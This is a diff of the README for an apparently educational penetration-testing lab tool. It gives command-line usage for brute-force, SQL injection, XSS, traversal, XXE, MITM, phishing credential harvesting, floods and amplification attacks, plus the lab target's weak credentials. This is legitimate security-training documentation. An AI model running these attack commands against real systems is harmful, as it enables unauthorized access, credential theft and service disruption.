-   ```
-
-2. Advanced Phishing Simulation
-   ```bash
-   # Custom form with SSL and logging
-   python src/cli.py credential-harvester \
-       --custom-form templates/custom.html \
-       --port 443 \
-       --ssl \
-       --cert company.crt \
-       --key company.key \
-       --redirect https://company.com \
-       --log-file phish_test.json
-   ```
-
-**Safety Considerations:**
-- Use only in authorized testing
-- Handle captured data securely
-- Delete sensitive data after testing
-- Monitor for unauthorized access
-- Document all test activities
-- Inform relevant security teams
-
-### Credential Attacks
-
-#### SSH Brute Force
-
-**Description:**  
-SSH Brute Force attack attempts to gain unauthorized access to SSH servers by systematically trying various username and password combinations. The attack can target a single host or multiple hosts, using wordlists for both usernames and passwords, with options for parallel attempts and rate limiting.
-
-**Attack Flow:**
-```mermaid
-graph TB
-    Start[Start Attack] --> Config[Configure Attack]
-    Config --> Load[Load Wordlists]
-    Load --> Init[Initialize Connections]
-    Init --> Loop[Try Credentials]
-    Loop --> Check{Success?}
-    Check -->|No| Rate[Rate Limit]
-    Rate --> NextCred[Next Credentials]
-    NextCred --> Loop
+    Start --> Load[Load Wordlist]
+    Load --> Try[Try Credentials]
+    Try --> Check{Success?}
+    Check -->|No| Next[Next Password]
     Check -->|Yes| Log[Log Success]
-    Log --> Continue{Continue?}
-    Continue -->|Yes| NextCred
-    Continue -->|No| End[End Attack]
+    Next --> Try
 ```
 
-**Key Features:**
-- Username/password list support
-- Connection rate limiting
-- Success detection
-- Result logging
-- Multi-threading support
-- Custom port targeting
-- Multiple target support
-
-**Parameters:**
-- `--target`: Single target IP or hostname
-- `--targets-file`: File containing multiple targets
-- `--username`: Single username to try
-- `--usernames-file`: File containing usernames
-- `--wordlist`: Password wordlist file
-- `--passwords-file`: Alternative password file
-- `--port`: SSH port (default: 22)
-- `--threads`: Number of parallel attempts
-- `--timeout`: Connection timeout in seconds
-- `--delay`: Delay between attempts
-- `--stop-on-success`: Stop after finding valid credentials
-- `--output`: Output file for results
-
-**Example Usage:**
 ```bash
-# Basic SSH brute force - Single target
-python src/cli.py ssh-brute-force \
-    --target 192.168.1.100 \
-    --username admin \
-    --wordlist passwords.txt
+# Create a short wordlist inside the attacker container
+docker compose exec attacker sh -c \
+  "printf 'admin\nroot\npassword123\n' > /tmp/wordlist.txt"
 
-# Advanced SSH brute force - Multiple targets
-python src/cli.py ssh-brute-force \
-    --target 192.168.1.100 \
-    --targets-file targets.txt \
-    --usernames-file users.txt \
-    --passwords-file passwords.txt \
-    --port 2222 \
-    --threads 4 \
-    --timeout 30 \
-    --stop-on-success \
-    --output results.txt
+# Run the attack
+docker compose exec attacker \
+  matcha ssh-brute-force \
+    --target-ip $TARGET_IP \
+    --username demo \
+    --wordlist /tmp/wordlist.txt
 ```
 
-**Attack Scenarios:**
-1. Single User Testing
-   ```bash
-   # Test specific user account
-   python src/cli.py ssh-brute-force \
-       --target 192.168.1.100 \
-       --username root \
-       --wordlist common_passwords.txt \
-       --delay 2 \
-       --stop-on-success
-   ```
+**Key parameters:**
+- `--target-ip` — target IP or hostname
+- `--username` — username to test
+- `--wordlist` — path to password list
+- `--port` — SSH port (default: 22)
 
-2. Multiple Target Scan
-   ```bash
-   # Scan network range with common credentials
-   python src/cli.py ssh-brute-force \
-       --targets-file ssh_hosts.txt \
-       --usernames-file default_users.txt \
-       --passwords-file default_passes.txt \
-       --threads 2 \
-       --timeout 10 \
-       --output scan_results.txt
-   ```
+**Target credentials (intentionally weak):**
+- `demo` / `password123`
+- `root` / `root123`
 
-**Safety Considerations:**
-- Use appropriate delays to avoid account lockouts
-- Monitor for security system alerts
-- Be cautious with thread count to avoid DoS
-- Keep logs of all testing activities
-- Respect target system's security policies
-- Consider impact on legitimate users
+---
 
-#### SQL Injection
+### FTP Brute Force
 
-**Description:**  
-SQL Injection testing identifies vulnerabilities in web applications where user input is improperly sanitized before being used in SQL queries. The tool systematically tests various injection points with different payloads, analyzing responses to detect successful injections and potential database exposure.
+Attempts FTP login with a wordlist. The target runs vsftpd with anonymous
+access enabled.
 
-**Attack Flow:**
+```bash
+# Reuse the wordlist created above or create a new one
+docker compose exec attacker sh -c \
+  "printf 'anonymous\nftp\npassword\n' > /tmp/ftp_words.txt"
+
+docker compose exec attacker \
+  matcha ftp-brute-force \
+    --target-ip $TARGET_IP \
+    --username anonymous \
+    --wordlist /tmp/ftp_words.txt
+```
+
+**Key parameters:**
+- `--target-ip` — FTP server host
+- `--username` — username to test
+- `--wordlist` — password list path
+- `--port` — FTP port (default: 21)
+
+---
+
+### RDP Brute Force
+
+Educational simulation of RDP credential brute-force (no real RDP library
+required).
+
+```bash
+docker compose exec attacker \
+  matcha rdp-brute-force \
+    --host <target-ip> \
+    --username administrator \
+    --passwords /tmp/wordlist.txt
+```
+
+> The target container does not run RDP. Use this against a host that does in
+> your authorized lab environment.
+
+---
+
+### SQL Injection
+
+Tests web application endpoints for SQL injection vulnerabilities by probing
+input parameters with various payloads.
+
 ```mermaid
 graph TB
-    Start[Start Scan] --> Config[Configure Test]
-    Config --> Analyze[Analyze Target]
-    Analyze --> Points[Identify Injection Points]
-    Points --> Test[Test Injection]
+    Start --> Points[Identify Injection Points]
+    Points --> Test[Inject Payload]
     Test --> Detect{Vulnerable?}
-    Detect -->|Yes| Verify[Verify Exploit]
+    Detect -->|Yes| Verify[Verify & Report]
     Detect -->|No| Next[Next Payload]
     Next --> Test
-    Verify --> Report[Generate Report]
-    Verify --> Extract[Extract Data]
-    Extract --> Cleanup[Cleanup]
 ```
 
-**Key Features:**
-- Multiple DBMS support (MySQL, PostgreSQL, etc.)
-- Form field detection and analysis
-- Error pattern recognition
-- Payload customization and testing
-- Response analysis
-- Automated exploitation
-- Comprehensive reporting
-
-**Parameters:**
-- `--target`: Target URL or endpoint
-- `--parameter`: Parameter to test for injection
-- `--dbms`: Target database type
-- `--risk`: Risk level (1-3)
-- `--level`: Test intensity level (1-5)
-- `--test-forms`: Test HTML form fields
-- `--test-cookies`: Test HTTP cookies
-- `--data`: POST data to include
-- `--headers`: Custom HTTP headers
-- `--proxy`: HTTP/SOCKS proxy
-- `--report-format`: Report format (text, html, json)
-- `--output-dir`: Directory for results
-
-**Example Usage:**
 ```bash
-# Basic SQL injection - Parameter testing
-python src/cli.py sql-injection \
-    --target http://example.com/login.php \
+docker compose exec attacker \
+  matcha sql-injection \
+    --target http://target/login.php \
     --parameter username \
     --dbms mysql
-
-# Advanced SQL injection - Comprehensive scan
-python src/cli.py sql-injection \
-    --target http://example.com/login.php \
-    --parameter username \
-    --dbms mysql \
-    --risk 2 \
-    --level 3 \
-    --test-forms \
-    --test-cookies \
-    --report-format html \
-    --output-dir /path/to/reports
 ```
 
-**Attack Scenarios:**
-1. Basic Authentication Bypass
-   ```bash
-   # Test login form
-   python src/cli.py sql-injection \
-       --target http://example.com/login \
-       --parameter username \
-       --dbms mysql \
-       --test-forms \
-       --risk 1
-   ```
+**Key parameters:**
+- `--target` — URL of the vulnerable endpoint
+- `--parameter` — parameter name to test
+- `--dbms` — database type (`mysql`, `postgresql`, etc.)
 
-2. Advanced Data Extraction
-   ```bash
-   # Comprehensive parameter testing
-   python src/cli.py sql-injection \
-       --target http://example.com/api \
-       --data "id=1&type=user" \
-       --headers '{"X-API-Key": "test"}' \
-       --dbms postgresql \
-       --risk 3 \
-       --level 5 \
-       --proxy http://127.0.0.1:8080
+---
 
-#### UDP Flood
+### XSS
 
-**Description:**  
-UDP Flood attack overwhelms a target system by sending a large volume of UDP packets to random or specific ports, consuming bandwidth and processing resources.
+Tests web application inputs for reflected or stored Cross-Site Scripting
+vulnerabilities.
 
-**Attack Flow:**
-```mermaid
-sequenceDiagram
-    participant A as Attacker
-    participant T as Target
-    loop Flood
-        A->>T: UDP Packet (Random Port)
-        Note over T: Check for service
-        T->>A: ICMP Port Unreachable
-    end
-```
-
-**Key Features:**
-- Random or specific port targeting
-- IP spoofing capability
-- Variable payload sizes
-- Rate control
-- Bandwidth consumption monitoring
-
-**Parameters:**
-- `--target`: Target IP address
-- `--port`: Specific port or port range
-- `--random-ports`: Use random destination ports
-- `--count`: Number of packets
-- `--rate`: Packets per second
-- `--payload-size`: Payload size in bytes
-- `--spoof/--no-spoof`: IP spoofing control
-
-**Example Usage:**
 ```bash
-python src/cli.py udp-flood --target 192.168.1.10 --port 53 --count 1000 --rate 100
+docker compose exec attacker \
+  matcha xss \
+    --url http://target/search \
+    --param q
 ```
 
-**Safety Considerations:**
-- Monitor network bandwidth
-- Start with low packet rates
-- Verify target capacity
+**Key parameters:**
+- `--url` — target URL
+- `--param` — parameter to inject into
 
-#### ICMP Flood
+---
 
-**Description:**  
-ICMP Flood (Ping Flood) overwhelms a target with ICMP Echo Request packets, consuming bandwidth and resources as the target processes packets and generates responses.
+### Directory Traversal
 
-**Attack Flow:**
-```mermaid
-graph LR
-    A[Attacker] -->|ICMP Echo Request| T[Target]
-    T -->|ICMP Echo Reply| A
-    A -->|ICMP Echo Request| T
-    T -->|ICMP Echo Reply| A
-```
+Probes URL parameters for path traversal vulnerabilities (`../` sequences) to
+read files outside the web root.
 
-**Key Features:**
-- High-speed packet generation
-- Variable packet sizes
-- IP spoofing
-- Rate limiting
-- Real-time statistics
-
-**Parameters:**
-- `--target`: Target IP address
-- `--count`: Number of packets
-- `--rate`: Packets per second
-- `--size`: Packet size in bytes
-- `--spoof/--no-spoof`: IP spoofing control
-
-**Example Usage:**
 ```bash
-python src/cli.py icmp-flood --target 192.168.1.10 --count 5000 --rate 500 --size 1400
+docker compose exec attacker \
+  matcha directory-traversal \
+    --url http://target/view \
+    --param file
 ```
 
-**Safety Considerations:**
-- Monitor ICMP rate limits
-- Be aware of amplification effects
-- Check network congestion
+**Key parameters:**
+- `--url` — target URL
+- `--param` — parameter to test
 
-#### Man-in-the-Middle (MITM)
+---
 
-**Description:**  
-MITM attack using ARP spoofing to intercept traffic between two hosts by poisoning their ARP caches.
+### XXE
 
-**Attack Flow:**
-```mermaid
-sequenceDiagram
-    A->>V: Poisoned ARP (Gateway)
-    A->>G: Poisoned ARP (Victim)
-    V->>A: Traffic for Gateway
-    A->>G: Forward traffic
-    G->>A: Response
-    A->>V: Forward response
-```
+Injects malicious XML external entity declarations to test XML parsers for
+file-read or SSRF vulnerabilities.
 
-**Key Features:**
-- Bidirectional ARP poisoning
-- Automatic IP forwarding
-- Packet capture capability
-- Graceful cleanup
-- MAC address resolution
-
-**Parameters:**
-- `--target`: Victim IP address
-- `--gateway`: Gateway IP address
-- `--interface`: Network interface
-- `--interval`: ARP poison interval
-- `--capture`: Save packets to file
-
-**Example Usage:**
-```bash
-sudo python src/cli.py mitm --target 192.168.1.10 --gateway 192.168.1.1 --interface eth0 --capture output.pcap
-```
-
-**Safety Considerations:**
-- Always restore ARP tables
-- Monitor network stability
-- Enable IP forwarding properly
-
-#### DHCP Starvation
-
-**Description:**  
-Exhausts DHCP server's IP address pool by sending numerous DISCOVER requests with spoofed MAC addresses.
-
-**Attack Flow:**
-```mermaid
-sequenceDiagram
-    loop Multiple MACs
-        A->>D: DHCP DISCOVER (Random MAC)
-        D->>A: DHCP OFFER
-        A->>D: DHCP REQUEST
-        D->>A: DHCP ACK
-        Note over D: IP Pool Depleted
-    end
-```
-
-**Key Features:**
-- Random MAC generation
-- Configurable request rate
-- Pool exhaustion monitoring
-- Network interface targeting
-
-**Parameters:**
-- `--interface`: Network interface
-- `--count`: Number of requests
-- `--rate`: Requests per second
-
-**Example Usage:**
-```bash
-sudo python src/cli.py dhcp-starvation --interface eth0 --count 200 --rate 10
-```
-
-**Safety Considerations:**
-- Can disrupt network services
-- Monitor DHCP server capacity
-- Have recovery plan ready
-
-#### MAC Flooding
-
-**Description:**  
-Overwhelms switch MAC address table causing fail-open mode where switch broadcasts all traffic.
-
-**Attack Flow:**
-```mermaid
-graph TB
-    A[Attacker] -->|Frame: Random MAC 1| S[Switch]
-    A -->|Frame: Random MAC 2| S
-    A -->|Frame: Random MAC N| S
-    Note["MAC Table Full
-    Switch enters fail-open"] --> S
-```
-
-**Key Features:**
-- Random source MAC generation
-- High-speed frame transmission
-- Switch behavior monitoring
-- Configurable frame rates
-
-**Parameters:**
-- `--interface`: Network interface
-- `--count`: Number of frames
-- `--rate`: Frames per second
-
-**Example Usage:**
-```bash
-sudo python src/cli.py mac-flooding --interface eth0 --count 10000 --rate 500
-```
-
-**Safety Considerations:**
-- Can disrupt entire network segment
-- Monitor switch CPU usage
-- Have network recovery procedures
-
-#### VLAN Hopping
-
-**Description:**  
-Uses double VLAN tagging to hop between network VLANs, bypassing VLAN isolation.
-
-**Attack Flow:**
-```mermaid
-sequenceDiagram
-    A->>S: Frame with Double VLAN Tags
-    Note over S: Strip Outer Tag (VLAN 10)
-    S->>T: Forward with Inner Tag (VLAN 20)
-    Note over T: Receive on VLAN 20
-```
-
-**Key Features:**
-- Double VLAN tagging
-- VLAN isolation bypass
-- Configurable VLAN IDs
-- Packet crafting
-
-**Parameters:**
-- `--interface`: Network interface
-- `--outer-vlan`: Outer VLAN ID
-- `--inner-vlan`: Inner VLAN ID
-- `--target`: Target IP address
-- `--count`: Number of packets
-
-**Example Usage:**
-```bash
-sudo python src/cli.py vlan-hopping --interface eth0 --outer-vlan 10 --inner-vlan 20 --target 192.168.20.1
-```
-
-**Safety Considerations:**
-- Test VLAN configuration first
-- Monitor for unexpected traffic
-- Verify switch VLAN settings
-
-#### HTTP Flood
-
-**Description:**  
-Application-layer DoS attack sending numerous HTTP requests to overwhelm web servers.
-
-**Attack Flow:**
-```mermaid
-graph LR
-    A[Attacker] -->|HTTP Request 1| W[Web Server]
-    A -->|HTTP Request 2| W
-    A -->|HTTP Request N| W
-    Note["Server Resources
-    Exhausted"] --> W
-```
-
-**Key Features:**
-- Multi-threaded requests
-- Customizable request parameters
-- Connection pooling
-- Rate limiting
-- Success verification
-
-**Parameters:**
-- `--url`: Target URL
-- `--count`: Number of requests
-- `--threads`: Number of threads
-
-**Example Usage:**
-```bash
-python src/cli.py http-flood --url http://target.com --count 1000 --threads 10
-```
-
-**Safety Considerations:**
-- Start with low thread count
-- Monitor server response
-- Check for rate limiting
-
-#### Cross-Site Scripting (XSS)
-
-**Description:**  
-Tests web applications for XSS vulnerabilities by injecting malicious scripts into input fields.
-
-**Attack Flow:**
-```mermaid
-graph TB
-    A[Attacker] -->|Inject Payload| W[Web App]
-    W -->|Reflect in Response| A
-    A -->|Verify Execution| V[Vulnerability Found]
-```
-
-**Key Features:**
-- Multiple payload testing
-- Response analysis
-- Reflected/Stored XSS detection
-- Custom payload support
-
-**Parameters:**
-- `--url`: Target URL
-- `--param`: Parameter to test
-- `--payloads`: Custom payloads file
-
-**Example Usage:**
-```bash
-python src/cli.py xss --url http://target.com/search --param q
-```
-
-**Safety Considerations:**
-- Only test authorized applications
-- Don't execute malicious payloads
-- Report findings responsibly
-
-#### Directory Traversal
-
-**Description:**  
-Tests for directory traversal vulnerabilities by attempting to access files outside web root.
-
-**Attack Flow:**
-```mermaid
-graph LR
-    A[Attacker] -->|../../../etc/passwd| W[Web App]
-    W -->|File Contents or Error| A
-```
-
-**Key Features:**
-- Multiple traversal techniques
-- Path encoding variants
-- Response pattern matching
-- Vulnerability verification
-
-**Parameters:**
-- `--url`: Target URL
-- `--param`: Parameter to test
-- `--payloads`: Custom payloads file
-
-**Example Usage:**
-```bash
-python src/cli.py directory-traversal --url http://target.com/view --param file
-```
-
-**Safety Considerations:**
-- Test only authorized systems
-- Handle sensitive data appropriately
-- Document findings securely
-
-#### XML External Entity (XXE)
-
-**Description:**  
-Tests for XXE vulnerabilities in XML parsers by injecting malicious external entity declarations.
-
-**Attack Flow:**
 ```mermaid
 sequenceDiagram
     A->>W: XML with External Entity
@@ -1255,421 +759,184 @@ sequenceDiagram
     W->>A: Response with File Data
 ```
 
-**Key Features:**
-- Multiple XXE payloads
-- File read detection
-- SSRF testing
-- Response analysis
-
-**Parameters:**
-- `--url`: Target URL
-- `--payloads`: Custom payloads file
-
-**Example Usage:**
 ```bash
-python src/cli.py xxe --url http://target.com/api/xml
+docker compose exec attacker \
+  matcha xxe \
+    --url http://target/api/xml
 ```
 
-**Safety Considerations:**
-- Test only with authorization
-- Be cautious with file access
-- Report vulnerabilities properly
+---
 
-#### SSL Strip
+### SSL Strip
 
-**Description:**  
-Downgrades HTTPS connections to HTTP by intercepting and modifying traffic (simulation).
+Downgrades HTTPS connections to HTTP by intercepting traffic at the network
+layer (educational simulation).
 
-**Attack Flow:**
-```mermaid
-graph LR
-    V[Victim] -->|HTTPS Request| A[Attacker]
-    A -->|HTTP Request| S[Server]
-    S -->|HTTPS Response| A
-    A -->|HTTP Response| V
-```
-
-**Key Features:**
-- HTTPS downgrade simulation
-- Traffic interception
-- Certificate manipulation
-- Educational demonstration
-
-**Parameters:**
-- `--interface`: Network interface
-
-**Example Usage:**
 ```bash
-sudo python src/cli.py ssl-strip --interface eth0
+docker compose exec attacker \
+  matcha ssl-strip \
+    --interface eth0
 ```
 
-**Safety Considerations:**
-- Requires MITM position
-- Detectable by HSTS
-- Educational simulation only
+> Requires a MITM position on the network. Modern HSTS defeats this attack.
 
-#### BGP Hijacking
+---
 
-**Description:**  
-Simulates BGP route advertisement manipulation (educational simulation).
+### Man-in-the-Middle (MITM)
 
-**Key Features:**
-- Route announcement simulation
-- AS path manipulation
-- Educational demonstration
+Performs bidirectional ARP poisoning to intercept traffic between two hosts,
+with optional packet capture.
 
-**Parameters:**
-- `--prefix`: Target IP prefix
-- `--as-number`: AS number
-
-**Example Usage:**
-```bash
-python src/cli.py bgp-hijacking --prefix 1.2.3.0/24 --as-number 65000
-```
-
-**Safety Considerations:**
-- Simulation only
-- Requires BGP router access in reality
-- Highly regulated attack type
-
-### Amplification Attacks
-
-#### Smurf Attack
-
-**Description:**  
-Amplification attack using ICMP broadcast to multiply traffic toward victim.
-
-**Attack Flow:**
 ```mermaid
 sequenceDiagram
-    A->>B: ICMP Echo (Spoofed Source: Victim)
-    B->>V: ICMP Replies from All Hosts
+    A->>V: Poisoned ARP (Gateway MAC = Attacker)
+    A->>G: Poisoned ARP (Victim MAC = Attacker)
+    V->>A: Traffic meant for Gateway
+    A->>G: Forward traffic
+    G->>A: Response
+    A->>V: Forward response
 ```
 
-**Key Features:**
-- ICMP broadcast exploitation
-- IP spoofing
-- Amplification factor
-- Bandwidth multiplication
-
-**Parameters:**
-- `--victim`: Victim IP address
-- `--broadcast`: Broadcast IP address
-- `--count`: Number of packets
-
-**Example Usage:**
 ```bash
-sudo python src/cli.py smurf-attack --victim 192.168.1.10 --broadcast 192.168.1.255 --count 100
+docker compose exec attacker \
+  matcha mitm \
+    --target <victim-ip> \
+    --gateway <gateway-ip> \
+    --interface eth0 \
+    --capture /tmp/captured.pcap
 ```
 
-**Safety Considerations:**
-- Massive amplification possible
-- Monitor network load
-- Restricted by modern networks
+**Key parameters:**
+- `--target` — victim IP
+- `--gateway` — gateway IP
+- `--interface` — network interface
+- `--capture` — optional PCAP output path
 
-#### NTP Amplification
+---
 
-**Description:**  
-Exploits NTP servers to amplify traffic toward victim using monlist command.
+### Credential Harvester
 
-**Attack Flow:**
-```mermaid
-sequenceDiagram
-    A->>N: NTP Query (Spoofed: Victim)
-    N->>V: Large NTP Response
-    Note over V: Amplification ~500x
-```
+Clones a login page and captures submitted credentials (phishing simulation).
 
-**Key Features:**
-- Multiple NTP server support
-- High amplification factor
-- Query type selection
-- Server rotation
-
-**Parameters:**
-- `--victim`: Victim IP address
-- `--ntp-servers`: NTP server list
-- `--count`: Number of packets
-
-**Example Usage:**
-```bash
-sudo python src/cli.py ntp-amplification --victim 192.168.1.10 --ntp-servers "1.2.3.4,5.6.7.8" --count 100
-```
-
-**Safety Considerations:**
-- Extremely high amplification
-- Most servers patched
-- Illegal without authorization
-
-### Credential Attacks
-
-#### FTP Brute Force
-
-**Description:**  
-Attempts to gain FTP access by systematically trying username/password combinations.
-
-**Attack Flow:**
 ```mermaid
 graph TB
-    Start --> Try[Try Credentials]
-    Try --> Check{Success?}
-    Check -->|No| Next[Next Password]
-    Check -->|Yes| Log[Log Success]
-    Next --> Try
+    Start --> Clone[Clone Target Site]
+    Clone --> Listen[Listen for Connections]
+    Listen --> Process{Request type?}
+    Process -->|Form submit| Collect[Collect Credentials]
+    Process -->|Other| Redirect[Redirect to Real Site]
+    Collect --> Log[Log to File]
 ```
 
-**Key Features:**
-- Password list support
-- Connection management
-- Success detection
-- Result logging
-
-**Parameters:**
-- `--host`: FTP server host
-- `--port`: FTP port (default: 21)
-- `--username`: Username to test
-- `--passwords`: Password list file
-
-**Example Usage:**
 ```bash
-python src/cli.py ftp-brute-force --host 192.168.1.10 --username admin --passwords passwords.txt
+docker compose exec attacker \
+  matcha credential-harvester \
+    --template login-form \
+    --port 8080
 ```
 
-**Safety Considerations:**
-- Respect rate limits
-- Avoid account lockouts
-- Monitor for detection
+**Key parameters:**
+- `--template` — predefined template or `--target-url` to clone a real page
+- `--port` — port to serve the phishing page on
+- `--log-file` — where to save captured credentials
 
-#### RDP Brute Force
+---
 
-**Description:**  
-Simulates RDP brute force attempts (educational simulation).
+## PCAP Replay
 
-**Key Features:**
-- Password list iteration
-- Connection simulation
-- Educational demonstration
+Replays previously captured network traffic from a `.pcap` file, with control
+over timing and interface.
 
-**Parameters:**
-- `--host`: RDP server host
-- `--port`: RDP port (default: 3389)
-- `--username`: Username to test
-- `--passwords`: Password list file
-
-**Example Usage:**
-```bash
-python src/cli.py rdp-brute-force --host 192.168.1.10 --username administrator --passwords passwords.txt
-```
-
-**Safety Considerations:**
-- Simulation only
-- Real RDP brute force requires specialized libraries
-- High detection rate
-
-## PCAP Replay Attacks
-
-**Description:**  
-PCAP Replay functionality allows for the reproduction of previously captured network traffic. This is useful for testing network security controls, analyzing protocol behaviors, and reproducing specific network conditions or attacks. The tool provides control over packet timing, filtering, and interface selection.
-
-**Attack Flow:**
 ```mermaid
 sequenceDiagram
     participant A as Attacker
     participant N as Network
     participant T as Target
     A->>A: Load PCAP File
-    A->>A: Parse Packets
-    A->>A: Apply Filters
-    Note over A: Configure Timing
     loop Replay Sequence
         A->>N: Send Packet
-        Note over N: Network Transit
         N->>T: Packet Arrives
-        Note over A: Timing Control
-        Note over T: Monitor Response
     end
-    Note over A: Statistics Collection
 ```
 
-**Key Features:**
-- PCAP file support
-- Packet timing control
-- Traffic filtering
-- Interface selection
-- Speed adjustment
-- Loop control
-- Statistics reporting
-- Protocol modification
-
-**Parameters:**
-- `--file`: PCAP file to replay
-- `--interface`: Network interface to use
-- `--filter`: BPF filter expression
-- `--loop`: Number of replay iterations
-- `--speed`: Replay speed multiplier
-- `--timing`: Timing mode (original/fast/custom)
-- `--start-time`: Start time offset
-- `--duration`: Replay duration
-- `--modify-ip`: Modify IP addresses
-- `--stats`: Enable statistics collection
-- `--output`: Statistics output file
-
-**Example Usage:**
 ```bash
-# Basic PCAP replay - Simple replay
-python src/cli.py pcap-replay \
-    --file capture.pcap \
-    --interface eth0
-
-# Advanced PCAP replay - With options
-python src/cli.py pcap-replay \
-    --file capture.pcap \
+# Mount a local pcap file into the container, then replay it
+docker run --rm \
+  --cap-add NET_ADMIN --cap-add NET_RAW \
+  --network mmt-attacker_lab \
+  -v /path/to/capture.pcap:/pcaps/capture.pcap \
+  matcha pcap-replay \
+    --pcap-file /pcaps/capture.pcap \
     --interface eth0 \
-    --filter "tcp port 80" \
-    --loop 3 \
-    --speed 2.0 \
-    --timing original \
-    --stats \
-    --output replay_stats.json
+    --speed 2.0
+
+# Or if the pcap is already inside the attacker container
+docker compose exec attacker \
+  matcha pcap-replay \
+    --pcap-file /pcaps/capture.pcap \
+    --interface eth0
 ```
 
-**Attack Scenarios:**
-1. HTTP Traffic Replay
-   ```bash
-   # Replay web traffic
-   python src/cli.py pcap-replay \
-       --file http_traffic.pcap \
-       --interface eth0 \
-       --filter "tcp port 80 or port 443" \
-       --timing original \
-       --modify-ip
-   ```
+**Key parameters:**
+- `--pcap-file` — path to the `.pcap` file
+- `--interface` — network interface to send on
+- `--speed` — playback speed multiplier (1.0 = real-time, 2.0 = double speed)
 
-2. DoS Attack Simulation
-   ```bash
-   # Replay attack traffic at high speed
-   python src/cli.py pcap-replay \
-       --file dos_attack.pcap \
-       --interface eth0 \
-       --speed 10.0 \
-       --loop 5 \
-       --stats \
-       --output dos_simulation.json
-   ```
+---
 
-**Safety Considerations:**
-- Verify target environment capacity
-- Monitor network bandwidth usage
-- Be cautious with replay speed settings
-- Consider impact on production systems
-- Test filters before full replay
-- Monitor system resources
-- Keep replay logs for analysis
+## Observing the Target
+
+While attacks run, open a second terminal to inspect the target container:
+
+```bash
+# Live nginx access log (HTTP DoS, HTTP Flood, Slowloris)
+docker compose exec target tail -f /var/log/nginx/access.log
+
+# SSH auth log (SSH Brute Force)
+docker compose exec target tail -f /var/log/auth.log
+
+# Active network connections
+docker compose exec target netstat -ant
+
+# Drop into a shell on the target
+docker compose exec target bash
+```
+
+---
 
 ## Ethical Considerations
 
-### Professional Ethics
+1. **Authorization** — obtain explicit written permission before any test.
+2. **Controlled environments** — use only in isolated lab networks.
+3. **Data protection** — handle captured credentials and PCAPs securely;
+   delete after testing.
+4. **Responsible disclosure** — report findings to the relevant security team
+   and give time to fix before public disclosure.
+5. **Legal compliance** — follow local laws, GDPR, and applicable regulations.
 
-1. **Authorization**
-   - Obtain explicit written permission before testing
-   - Document scope and limitations of authorization
-   - Respect boundaries of testing agreements
-   - Report findings responsibly to stakeholders
+---
 
-2. **Responsible Testing**
-   - Use only in controlled environments
-   - Minimize impact on production systems
-   - Avoid collateral damage to other services
-   - Follow the principle of least privilege
+## Troubleshooting
 
-3. **Data Protection**
-   - Protect sensitive information discovered during testing
-   - Handle credentials and tokens securely
-   - Encrypt and secure test results
-   - Delete sensitive data after testing
+| Symptom | Likely cause | Fix |
+|---|---|---|
+| `Operation not permitted` | Missing `NET_ADMIN`/`NET_RAW` capabilities | Ensure `cap_add` is set in `docker-compose.yml` |
+| `Cannot find target` | DNS not resolving `target` | Verify both containers are on the `lab` network (`docker compose ps`) |
+| Attack exits immediately | Invalid parameter | Run `matcha info <attack>` to check required flags |
+| No output from attack | Silent failure | Add `--verbose` if supported, check `docker compose logs attacker` |
+| Target not responding | Container not started | Run `docker compose up -d` and check `docker compose ps` |
+| `Address already in use` | Port conflict on host | Change host port mapping in `docker-compose.yml` |
 
-### Legal Compliance
-
-1. **Regulatory Requirements**
-   - Comply with local cybersecurity laws
-   - Follow data protection regulations (GDPR, etc.)
-   - Maintain proper documentation for compliance
-   - Understand jurisdiction-specific restrictions
-
-2. **Industry Standards**
-   - Follow security testing frameworks
-   - Adhere to professional certifications requirements
-   - Maintain industry-standard documentation
-   - Use approved testing methodologies
-
-### Responsible Disclosure
-
-1. **Vulnerability Reporting**
-   - Follow responsible disclosure policies
-   - Give organizations time to fix issues
-   - Provide clear documentation of findings
-   - Maintain confidentiality during disclosure
-
-2. **Communication**
-   - Use appropriate channels for reporting
-   - Document findings professionally
-   - Provide remediation recommendations
-   - Follow up on reported issues
-
-### Risk Management
-
-1. **Impact Assessment**
-   - Evaluate potential system impact
-   - Consider business continuity
-   - Assess network stability risks
-   - Plan for incident response
-
-2. **Mitigation Strategies**
-   - Have rollback procedures ready
-   - Maintain system backups
-   - Monitor for unintended effects
-   - Document all testing activities
-
-### Professional Development
-
-1. **Skill Enhancement**
-   - Stay updated with security trends
-   - Learn about new attack vectors
-   - Understand defense mechanisms
-   - Practice responsible testing
-
-2. **Knowledge Sharing**
-   - Contribute to security community
-   - Share lessons learned
-   - Help improve security tools
-   - Mentor others in ethical testing
-
-## Safety Warning
-
-⚠️ **IMPORTANT**: This tool is for educational and testing purposes only. Always:
-- Obtain proper authorization before testing
-- Use in controlled environments only
-- Follow responsible disclosure practices
-- Comply with all applicable laws and regulations
+---
 
 ## License
 
-Copyright (c) 2025 Montimage
-
-All rights reserved. This software and associated documentation files (the "Software") are the proprietary property of Montimage and are protected by intellectual property laws. Any use, copying, modification, or distribution of the Software without express written permission from Montimage is strictly prohibited.
-
-For licensing inquiries, please contact: contact@montimage.eu
+Apache 2.0 — see [LICENSE](../LICENSE).
 
 ## Contact
 
 **Montimage**
 - Website: https://www.montimage.eu
 - Email: contact@montimage.eu
-- Address: 39 rue Bobillot, 75013 Paris, France
-- Phone: +33 1 53 14 33 91
-
-For technical support:
-- Email: developer@montimage.eu
-- GitHub: https://github.com/montimage/mmt-attacker/issues
-
-
+- Technical support: developer@montimage.eu
+- Issues: https://github.com/montimage/mmt-attacker/issues
